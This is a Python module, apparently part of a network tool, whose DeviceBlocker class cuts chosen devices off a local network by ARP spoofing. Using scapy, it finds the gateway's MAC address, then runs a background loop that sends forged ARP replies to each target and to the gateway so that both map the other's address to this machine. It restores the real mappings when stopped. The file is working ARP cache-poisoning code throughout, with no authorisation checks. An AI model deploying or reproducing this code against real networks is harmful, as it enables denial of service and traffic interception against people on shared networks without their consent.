import threading
import time
from typing import Dict, Optional
from scapy.all import ARP, Ether, send

from ..utils.network import get_local_ip


class DeviceBlocker:
    def __init__(self):
        self._blocked: Dict[str, str] = {}
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._gateway_ip: Optional[str] = None
        self._gateway_mac: Optional[str] = None

    def discover_gateway(self):
        import socket
        local_ip = get_local_ip()
        gw = local_ip.rsplit(".", 1)[0] + ".1"
        self._gateway_ip = gw

        from scapy.all import ARP, Ether, srp
        arp = ARP(pdst=gw)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        result = srp(ether / arp, timeout=3, verbose=0)[0]
        if result:
            self._gateway_mac = result[0][1].hwsrc

    def block_device(self, device_ip: str, device_mac: str):
        if not self._gateway_mac or not self._gateway_ip:
            self.discover_gateway()
        self._blocked[device_mac] = device_ip

    def unblock_device(self, device_mac: str):
        self._blocked.pop(device_mac, None)

    def is_blocked(self, device_mac: str) -> bool:
        return device_mac in self._blocked

    def _send_spoof(self, target_ip: str, target_mac: str):
        if not self._gateway_ip or not self._gateway_mac:
            return

        # Tell the target we are the gateway
        spoof = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self._gateway_ip,
        )
        # Tell the gateway we are the target
        spoof2 = ARP(
            op=2,
            pdst=self._gateway_ip,
            hwdst=self._gateway_mac,
            psrc=target_ip,
        )
        send(spoof, verbose=0)
        send(spoof2, verbose=0)

    def _restore_arp(self, target_ip: str, target_mac: str):
        if not self._gateway_ip or not self._gateway_mac:
            return

        restore = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self._gateway_ip,
            hwsrc=self._gateway_mac,
        )
        restore2 = ARP(
            op=2,
            pdst=self._gateway_ip,
            hwdst=self._gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac,
        )
        send(restore, verbose=0)
        send(restore2, verbose=0)

    def start_blocking(self):
        self._running = True
        self._thread = threading.Thread(target=self._block_loop, daemon=True)
        self._thread.start()

    def stop_blocking(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)

    def _block_loop(self):
        while self._running:
            for mac, ip in list(self._blocked.items()):
                self._send_spoof(ip, mac)
            time.sleep(2)

        for mac, ip in list(self._blocked.items()):
            self._restore_arp(ip, mac)
